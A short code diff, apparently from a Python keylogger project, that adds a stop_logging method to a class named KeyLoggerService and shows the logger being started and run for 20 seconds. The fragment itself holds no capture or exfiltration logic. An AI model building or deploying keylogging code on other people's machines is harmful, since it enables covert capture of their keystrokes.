@@ -30,6 +30,10 @@ class KeyLoggerService(IKeyLogger):
         self.data.clear()
         return copy_buffer
 
+    #Stop listener
+    def stop_logging(self):
+        self.listener.stop()
+
 logger = KeyLoggerService()
 logger.start_logging()
 time.sleep(20)
